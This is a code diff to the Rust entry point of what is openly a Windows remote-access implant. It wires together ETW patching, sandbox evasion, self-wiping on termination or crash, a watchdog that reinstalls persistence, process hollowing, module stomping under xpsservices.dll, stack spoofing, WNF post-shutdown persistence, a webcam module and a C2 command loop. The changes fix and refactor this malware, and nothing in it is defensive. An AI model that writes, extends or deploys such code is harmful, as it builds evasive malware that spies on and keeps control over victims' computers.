@@ -7,7 +7,7 @@
 //!   4. Selfdestruct  — register ctrl handler (wipe-on-SIGTERM)
 //!   5. Guardian      — spawn watchdog thread
 //!   6. VEH           — install exception handler (wipe-on-crash)
-//!   7. ETW + stomp   — patch EtwEventWrite; stomp ntdll module headers
+//!   7. Stomp + spoof — stomp ntdll headers; init stack-spoof gadget
 //!   8. Post-shutdown — install WNF persistence channel
 //!   9. C2 loop       — connect and serve commands
 
@@ -49,12 +49,24 @@ mod utils;
 mod watchdog;
 mod webcam;
 
+// ── Guardian callback shims ───────────────────────────────────────────────────
+// Named unsafe fn items (not closures) so they can be cast to fn-pointer
+// types (FnVoid / FnBool).  Non-capturing closures *are* coercible to fn
+// pointers in Rust, BUT they cannot call other `unsafe fn` from within a
+// non-unsafe closure body.  Using named `unsafe fn` avoids that.
+
+unsafe fn shim_wipe()     { selfdestruct::wipe_self(); }
+unsafe fn shim_purge()    { persist::purge_all(); }
+unsafe fn shim_drop_ads() { resurrect::drop_from_ads(); }
+unsafe fn shim_install()  { persist::install_all(); }
+unsafe fn shim_hollow() -> bool { hollow::run(&[]) }
+
 fn main() {
     unsafe {
         // 1. Silence ETW before any other API calls
         etw_patch::apply_all_blinds();
 
-        // 2. Anti-detect: abort if we're in a hostile analysis environment
+        // 2. Anti-detect: abort if hostile analysis environment
         if antidetect::is_sandboxed() {
             return;
         }
@@ -68,46 +80,44 @@ fn main() {
         // 4. Register console ctrl handler (wipe on CTRL+C / forced close)
         selfdestruct::register_ctrl_handler();
 
-        // Shims: cast no-arg unsafe fn() pointers for guardian callbacks
-        let fn_wipe:     unsafe fn() = || selfdestruct::wipe_self();
-        let fn_purge:    unsafe fn() = || persist::purge_all();
-        let fn_drop_ads: unsafe fn() = || resurrect::drop_from_ads();
-        let fn_install:  unsafe fn() = || persist::install_all();
-        let fn_hollow:   unsafe fn() -> bool = || hollow::run(&[]);
-
         // 5. Spawn guardian watchdog thread
         guardian::start_thread(
             fn_ntqsi,
             fn_sleep,
             fn_tick,
-            fn_wipe,
-            fn_purge,
-            fn_drop_ads,
-            fn_install,
-            fn_hollow,
+            shim_wipe,
+            shim_purge,
+            shim_drop_ads,
+            shim_install,
+            shim_hollow,
         );
 
         // 6. Install VEH (wipe-on-crash)
         guardian::install_veh(fn_add_veh);
 
-        // 7a. Stomp ntdll module list entry to hide our load path
-        stomp::stomp(core::ptr::null_mut(), 0);
+        // 7a. Module stomp — hide our .text under xpsservices.dll
+        // First three &[u16] args (_decoy_dll, _spoof_name, _spoof_path) are
+        // ignored by stomp::stomp — it uses the hardcoded DECOY_NAME_W const.
+        // We pass empty slices as the correct type.
+        let _ = stomp::stomp(&[], &[], &[], &[]);
 
-        // 7b. Init stack-spoof gadget
+        // 7b. Init stack-spoof gadget (must be after ntdll is in memory)
         spoof::init_gadget();
 
-        // 8. Install WNF post-shutdown persistence channel (all 7 params)
+        // 8. Install WNF post-shutdown persistence channel
+        // install_wnf_channel(state_name, type_id, scope, permanent,
+        //                     data_size, data, security_descriptor)
         post_shutdown::install_wnf_channel(
-            0x41C64E6D_u64,   // state_name  — well-known WNF_SHEL_* name
-            core::ptr::null(), // type_id
-            core::ptr::null(), // scope
-            0,                // permanent
-            4,                // data_size
-            core::ptr::null(), // data
-            0,                // security_descriptor
+            0x41C64E6D_u64,
+            core::ptr::null::<core::ffi::c_void>(),
+            core::ptr::null::<core::ffi::c_void>(),
+            0u32,
+            4usize,
+            core::ptr::null::<core::ffi::c_void>(),
+            0u32,
         );
 
-        // 9. SSN audit (debug/testing only — compiled out in release)
+        // 9. SSN audit (debug build only)
         #[cfg(feature = "ssn-audit")]
         ssn_audit::run();
 
